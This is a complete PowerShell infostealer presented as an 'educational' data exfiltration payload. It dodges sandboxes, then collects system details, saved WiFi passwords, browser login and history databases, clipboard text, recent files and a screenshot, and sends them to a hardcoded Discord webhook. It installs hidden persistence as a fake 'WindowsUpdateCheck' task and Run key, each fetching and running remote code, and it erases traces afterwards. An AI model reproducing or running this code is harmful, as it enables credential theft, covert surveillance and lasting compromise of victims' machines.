# Advanced Data Exfiltration Payload - Fixed Version
# Educational use only on your own systems

$webhookUrl = "https://discord.com/api/webhooks/1438102665900068966/IW_cUGLJMcqk9A8vHVlW-ELAjSSddZjFWJgmOKaVZgyHzO1QQPSiwUCmINI10blwstec"
$delay = 2

function Send-Discord {
    param([string]$msg, [string]$file)
    try {
        if ($file -and (Test-Path $file)) {
            $boundary = [guid]::NewGuid().ToString()
            $bytes = [IO.File]::ReadAllBytes($file)
            $enc = [Text.Encoding]::GetEncoding('ISO-8859-1').GetString($bytes)
            $body = "--$boundary`r`nContent-Disposition: form-data; name=`"content`"`r`n`r`n$msg`r`n--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $file -Leaf)`"`r`nContent-Type: application/octet-stream`r`n`r`n$enc`r`n--$boundary--"
            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body | Out-Null
        } else {
            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body (@{content=$msg}|ConvertTo-Json) | Out-Null
        }
        return $true
    } catch { return $false }
}

function Test-Sandbox {
    $score = 0
    $reasons = @()
    $vm = Get-WmiObject Win32_ComputerSystem
    if ($vm.Manufacturer -match "VMware|VirtualBox|Xen|QEMU|Microsoft Corporation") {
        $score += 3
        $reasons += "VM: $($vm.Manufacturer)"
    }
    $ram = [math]::Round($vm.TotalPhysicalMemory/1GB,2)
    if ($ram -lt 2) {
        $score += 2
        $reasons += "Low RAM: ${ram}GB"
    }
    $procs = @('vboxservice','vboxtray','vmtoolsd','vmwaretray','vmwareuser','wireshark','fiddler','procmon')
    $found = Get-Process | Where-Object { $procs -contains $_.Name.ToLower() }
    if ($found) {
        $score += 2
        $reasons += "Analysis tools: $($found.Name -join ',')"
    }
    return @{IsSandbox=($score -ge 4); Score=$score; Reasons=$reasons}
}

function Get-SysInfo {
    $os = Get-WmiObject Win32_OperatingSystem
    $cs = Get-WmiObject Win32_ComputerSystem
    $txt = "**🖥️ SYSTEM INFO**```"
    $txt += "`nComputer: $env:COMPUTERNAME"
    $txt += "`nUser: $env:USERNAME"
    $txt += "`nOS: $($os.Caption)"
    $txt += "`nBuild: $($os.BuildNumber)"
    $txt += "`nRAM: $([math]::Round($cs.TotalPhysicalMemory/1GB,2))GB"
    $txt += "`nCPU: $env:PROCESSOR_IDENTIFIER"
    $txt += "`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    $txt += "```"
    return $txt
}

function Get-NetInfo {
    $txt = "**🌐 NETWORK**```"
    $ips = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike '*Loopback*'}
    $txt += "`nLocal IPs:"
    foreach ($ip in $ips) { $txt += "`n  $($ip.InterfaceAlias): $($ip.IPAddress)" }
    try {
        $pub = (Invoke-RestMethod "http://ipinfo.io/json" -TimeoutSec 3).ip
        $txt += "`nPublic IP: $pub"
    } catch { $txt += "`nPublic IP: Failed" }
    $txt += "```"
    return $txt
}

function Get-WiFi {
    $txt = "**🔑 WIFI PASSWORDS**```"
    try {
        $profs = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[-1].Trim() }
        $count = 0
        foreach ($p in $profs) {
            $pass = (netsh wlan show profile name="$p" key=clear | Select-String "Key Content") -replace ".*: ",""
            if ($pass) {
                $txt += "`n$p : $pass"
                $count++
            }
        }
        if ($count -eq 0) { $txt += "`nNo networks found" }
    } catch { $txt += "`nFailed to get WiFi" }
    $txt += "```"
    return $txt
}

function Get-Browser {
    $txt = "**🌐 BROWSER DATA**```"
    $browsers = @(
        @{N="Chrome";P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default"},
        @{N="Edge";P="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"}
    )
    foreach ($b in $browsers) {
        $hist = Join-Path $b.P "History"
        $login = Join-Path $b.P "Login Data"
        if (Test-Path $hist) {
            try {
                Copy-Item $hist "$env:TEMP\$($b.N)_h_$(Get-Random).db" -EA Stop
                $txt += "`n$($b.N) History: ✅"
            } catch { $txt += "`n$($b.N) History: ❌ Locked" }
        }
        if (Test-Path $login) {
            try {
                Copy-Item $login "$env:TEMP\$($b.N)_l_$(Get-Random).db" -EA Stop
                $txt += "`n$($b.N) Passwords: ✅"
            } catch { $txt += "`n$($b.N) Passwords: ❌ Locked" }
        }
    }
    $txt += "```"
    return $txt
}

function Get-Clip {
    $txt = "**📋 CLIPBOARD**```"
    try {
        Add-Type -A System.Windows.Forms
        $c = [Windows.Forms.Clipboard]::GetText()
        if ($c -and $c.Length -gt 0) {
            if ($c.Length -gt 300) { $c = $c.Substring(0,300) + "..." }
            $txt += "`n$c"
        } else { $txt += "`n(Empty)" }
    } catch { $txt += "`nFailed" }
    $txt += "```"
    return $txt
}

function Get-Recent {
    $txt = "**📁 RECENT FILES**```"
    try {
        $files = Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -File | Sort LastWriteTime -Desc | Select -First 10
        foreach ($f in $files) { $txt += "`n[$($f.LastWriteTime.ToString('MM/dd HH:mm'))] $($f.Name)" }
    } catch { $txt += "`nFailed" }
    $txt += "```"
    return $txt
}

function Get-Screen {
    try {
        Add-Type -A System.Windows.Forms,System.Drawing
        $b = [Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object Drawing.Bitmap $b.Width,$b.Height
        $g = [Drawing.Graphics]::FromImage($bmp)
        $g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size)
        $p = "$env:TEMP\sc_$(Get-Random).png"
        $bmp.Save($p)
        $g.Dispose()
        $bmp.Dispose()
        return $p
    } catch { return $null }
}

function Set-Persist {
    $txt = "**🔄 PERSISTENCE**```"
    try {
        $url = "https://raw.githubusercontent.com/SaturnJZX/Security-test/refs/heads/main/payload.ps1"
        $cmd = "iex(iwr '$url' -UseBasicParsing).Content"
        $act = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-W Hidden -EP Bypass -C `"$cmd`""
        $tri = New-ScheduledTaskTrigger -AtLogOn
        $set = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries
        Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $act -Trigger $tri -Settings $set -Force | Out-Null
        $txt += "`n✅ Scheduled task created"
    } catch { $txt += "`n❌ Task failed (no admin)" }
    try {
        $reg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $reg -Name "WindowsUpdateCheck" -Value "powershell -W Hidden -EP Bypass -C `"iex(iwr 'https://tinyurl.com/mry2dk62' -UseBasicParsing).Content`"" -EA Stop
        $txt += "`n✅ Registry key added"
    } catch { $txt += "`n❌ Registry failed" }
    $txt += "```"
    return $txt
}

function Clear-Trace {
    try {
        Remove-Item (Get-PSReadlineOption).HistorySavePath -EA SilentlyContinue
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -EA SilentlyContinue
        Get-ChildItem $env:TEMP | Where-Object {$_.Name -like "*_h_*" -or $_.Name -like "*_l_*" -or $_.Name -like "*sc_*"} | Remove-Item -Force -EA SilentlyContinue
        return "**✅ CLEANUP**```Traces cleared```"
    } catch { return "**⚠️ CLEANUP**```Partial cleanup```" }
}

# Main execution
$sb = Test-Sandbox
if ($sb.IsSandbox) {
    Send-Discord "⚠️ **SANDBOX DETECTED**```Score: $($sb.Score)`n$($sb.Reasons -join "`n")```"
    exit
}

Send-Discord "🎯 **NEW INFECTION** - Starting collection..."
Start-Sleep -Seconds $delay

Send-Discord (Get-SysInfo)
Start-Sleep -Seconds $delay

Send-Discord (Get-NetInfo)
Start-Sleep -Seconds $delay

Send-Discord (Get-WiFi)
Start-Sleep -Seconds $delay

Send-Discord (Get-Browser)
Start-Sleep -Seconds $delay

Send-Discord (Get-Clip)
Start-Sleep -Seconds $delay

Send-Discord (Get-Recent)
Start-Sleep -Seconds $delay

Send-Discord (Set-Persist)
Start-Sleep -Seconds $delay

$sc = Get-Screen
if ($sc) {
    Send-Discord "📸 **Screenshot**" $sc
    Remove-Item $sc -Force -EA SilentlyContinue
    Start-Sleep -Seconds $delay
}

Send-Discord (Clear-Trace)
Start-Sleep -Seconds $delay

Send-Discord "✅ **COMPLETE** - Persistence active"
